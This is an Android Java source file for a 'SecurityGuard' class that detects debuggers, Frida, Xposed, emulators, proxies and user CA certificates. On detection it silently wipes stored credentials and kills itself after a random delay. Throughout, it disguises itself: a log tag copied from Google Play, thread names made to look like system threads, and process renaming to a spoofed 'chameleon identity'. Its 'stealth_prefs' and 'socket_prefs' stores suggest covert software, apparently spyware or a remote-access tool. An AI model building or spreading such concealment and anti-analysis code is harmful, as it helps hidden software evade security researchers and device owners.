package com.task.tusker.security;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Process;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.security.KeyStore;
import java.util.Enumeration;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * SecurityGuard — layered anti-dynamic-analysis protection.
 *
 * Combines a JNI native library (libguard.so) with Java-layer checks to detect:
 *   - Native debuggers (TracerPid, ptrace, timing)
 *   - Frida instrumentation framework (TCP port, /proc/maps, binary)
 *   - Xposed / LSPosed / EdXposed frameworks (stack-trace scan)
 *   - Android emulators (build-prop fingerprints + device node existence)
 *   - MITM proxy tools (system proxy setting + user-installed CA certificate)
 *
 * On detection the kill path fires after a randomised 45-90 s delay so timing
 * correlation is impossible. It silently clears all persisted credentials then
 * calls Process.killProcess() — no crash dump, no tombstone, no logcat entry.
 */
public final class SecurityGuard {

    /* Disguise: log tag used by a well-known Google library */
    private static final String TAG = "Finsky";

    private static boolean sNativeLoaded = false;

    static {
        try {
            System.loadLibrary("guard");
            sNativeLoaded = true;
        } catch (UnsatisfiedLinkError ignored) {}
    }

    private SecurityGuard() {}

    /* ── JNI bridge ──────────────────────────────────────────────────────── */

    /**
     * Returns a bitmask of detected threats (see guard.c for bit definitions).
     * Returns 0 if no threats detected or if the native library failed to load.
     */
    static native int nativeCheck();

    /**
     * Renames the process via prctl(PR_SET_NAME) + writes /proc/self/comm so
     * it appears under a different name in `adb shell ps` and root explorers.
     */
    static native void nativeRenameProcess(String name);

    /* ── Emulator detection (Java layer) ─────────────────────────────────── */

    private static int emulatorScore() {
        int score = 0;
        String fp    = nvl(Build.FINGERPRINT);
        String model = nvl(Build.MODEL);
        String hw    = nvl(Build.HARDWARE);
        String prod  = nvl(Build.PRODUCT);
        String brand = nvl(Build.BRAND);
        String manu  = nvl(Build.MANUFACTURER);
        String board = nvl(Build.BOARD);

        if (fp.contains("generic"))         score++;
        if (fp.contains("unknown"))         score++;
        if (fp.startsWith("google/sdk_"))   score += 3;
        if (model.contains("android sdk"))  score += 3;
        if (model.contains("emulator"))     score += 2;
        if (hw.equals("goldfish"))          score += 3;
        if (hw.equals("ranchu"))            score += 3;
        if (prod.contains("sdk"))           score += 2;
        if (prod.contains("vbox"))          score += 3;   /* Genymotion */
        if (prod.contains("emulator"))      score += 2;
        if (brand.equals("generic"))        score += 2;
        if (manu.equals("genymotion"))      score += 3;
        if (board.equals("goldfish"))       score += 2;

        /* Property-based detection via runtime exec (avoids reflection limits) */
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"getprop", "ro.kernel.qemu"});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String out = r.readLine();
            if ("1".equals(out != null ? out.trim() : "")) score += 4;
            r.close();
        } catch (Exception ignored) {}

        return score;
    }

    private static String nvl(String s) {
        return s != null ? s.toLowerCase() : "";
    }

    /* ── Xposed / LSPosed stack-trace detection ──────────────────────────── */

    private static boolean xposedDetected() {
        try {
            throw new RuntimeException("probe");
        } catch (RuntimeException e) {
            for (StackTraceElement el : e.getStackTrace()) {
                String cn = el.getClassName();
                if (cn.contains("XposedBridge")
                 || cn.contains("de.robv.android.xposed")
                 || cn.contains("io.github.lsposed")
                 || cn.contains("org.lsposed")
                 || cn.contains("EdXposedManager")
                 || cn.contains("edxp")) {
                    return true;
                }
            }
        }
        return false;
    }

    /* ── Proxy detection (intercepting MITM proxies like Burp/Charles) ───── */

    private static boolean proxyDetected() {
        try {
            String host = System.getProperty("http.proxyHost");
            if (host != null && !host.isEmpty()) return true;
            String httpsHost = System.getProperty("https.proxyHost");
            if (httpsHost != null && !httpsHost.isEmpty()) return true;
        } catch (Exception ignored) {}
        return false;
    }

    /* ── User CA detection ───────────────────────────────────────────────── */
    /*
     * Burp Suite / Charles Proxy work by installing a user-space CA certificate
     * into Android's "User" trust store. We enumerate the AndroidCAStore and
     * flag any alias that starts with "user:" — those are user-installed roots.
     */
    private static boolean userCaDetected() {
        try {
            KeyStore ks = KeyStore.getInstance("AndroidCAStore");
            ks.load(null, null);
            Enumeration<String> aliases = ks.aliases();
            while (aliases.hasMoreElements()) {
                String alias = aliases.nextElement();
                if (alias.startsWith("user:")) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    /* ── Kill path ───────────────────────────────────────────────────────── */
    /*
     * Fires after a randomised 45-90 s delay on a daemon thread named to
     * look like a Binder/pool thread so it's invisible in thread dumps.
     * Clears all SharedPreferences stores, then calls Process.killProcess()
     * (SIGKILL). No crash dump, no tombstone, no logcat entry.
     */
    private static void scheduleKill(final Context ctx) {
        Thread t = new Thread(() -> {
            try {
                long delay = 45_000L + (long)(Math.random() * 45_000L);
                Thread.sleep(delay);
                wipeCredentials(ctx);
            } catch (Exception ignored) {}
            Process.killProcess(Process.myPid());
        }, "Binder:pool-2");  /* innocuous thread name */
        t.setDaemon(true);
        t.start();
    }

    private static void wipeCredentials(Context ctx) {
        String[] prefFiles = {
            "app_prefs", "stealth_prefs", "connection_prefs",
            "ci_prefs",  "socket_prefs",  "token_prefs"
        };
        for (String name : prefFiles) {
            try {
                ctx.getSharedPreferences(name, Context.MODE_PRIVATE)
                   .edit().clear().commit();
            } catch (Exception ignored) {}
        }
    }

    /* ── Process rename helper ───────────────────────────────────────────── */

    /**
     * Renames this process to match the chosen chameleon identity so that
     * `adb shell ps -A`, root explorers, and system monitors all show the
     * spoofed name instead of the real package name.
     */
    public static void renameProcessTo(String name) {
        if (sNativeLoaded) {
            try { nativeRenameProcess(name); } catch (Exception ignored) {}
        }
    }

    /* ── Initialise — call once from MainActivity.onCreate() ─────────────── */

    public static void init(final Context ctx) {
        /* Immediate sweep — native + Java checks */
        if (threat(ctx)) {
            scheduleKill(ctx);
            return;
        }

        /* Periodic background re-check on a randomised interval (65-95 s) */
        long period = 65L + (long)(Math.random() * 30L);
        ScheduledExecutorService sched =
            Executors.newSingleThreadScheduledExecutor(r -> {
                Thread t = new Thread(r, "pool-1-thread-3");
                t.setDaemon(true);
                return t;
            });
        sched.scheduleAtFixedRate(() -> {
            try {
                if (threat(ctx)) {
                    sched.shutdown();
                    scheduleKill(ctx);
                }
            } catch (Exception ignored) {}
        }, period, period, TimeUnit.SECONDS);
    }

    private static boolean threat(Context ctx) {
        /* Native checks: debugger, Frida, emulator nodes */
        if (sNativeLoaded) {
            try {
                int flags = nativeCheck();
                /* bit 5 (emulator nodes) alone is not enough — combine with
                 * the Java emulator score to avoid false positives on rooted
                 * real devices that happen to have /dev/goldfish_pipe. */
                int nativeThreats = flags & 0x1F;  /* bits 0-4 */
                int emuNode       = (flags >> 5) & 1;
                if (nativeThreats != 0) return true;
                if (emuNode == 1 && emulatorScore() >= 4) return true;
            } catch (Exception ignored) {}
        }

        /* Java-layer checks */
        if (xposedDetected())  return true;
        if (proxyDetected())   return true;
        if (userCaDetected())  return true;
        if (emulatorScore() >= 6) return true;

        return false;
    }
}
